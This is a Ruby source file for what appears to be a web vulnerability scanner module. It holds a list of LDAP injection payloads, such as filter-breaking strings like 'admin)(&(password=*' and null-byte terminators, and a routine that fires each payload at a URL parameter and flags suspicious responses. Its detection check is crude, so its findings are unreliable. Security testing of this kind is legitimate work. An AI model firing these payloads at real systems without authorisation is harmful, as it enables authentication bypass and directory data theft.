require 'uri'
require_relative '../utils/network'
require_relative '../utils/colorize'

class LDAPInjection
  PAYLOADS = [
    '*',
    '*)(&',
    '*))%00',
    '*()|&',
    'admin)(&(password=*',
    'admin)(|(password=*',
    '*)(uid=*))(|(uid=*',
    '*)(|(mail=*',
    '*))%00',
    'admin',
    'admin*',
    '*admin',
    'admin)(*',
    '*)(&',
    '*))%00',
    '*()|&',
    'admin)(&(password=*',
    'admin)(|(password=*',
    '*)(uid=*))(|(uid=*',
    '*)(|(mail=*',
    '*))%00'
  ]

  def self.test(url, param = 'username')
    vulnerable = false
    
    PAYLOADS.each do |payload|
      begin
        test_url = url.include?("?") ? "#{url}&#{param}=#{URI.encode_www_form_component(payload)}" : "#{url}?#{param}=#{URI.encode_www_form_component(payload)}"
        response = Network.http_request(test_url)
        next unless response
        
        if response.body.include?("ldap") || response.body.include?("bind") || response.body.include?("search") || response.code != "200"
          puts Colorize.red("LDAP injection: #{payload}")
          vulnerable = true
        end
      rescue
      end
    end
    
    vulnerable
  end
end

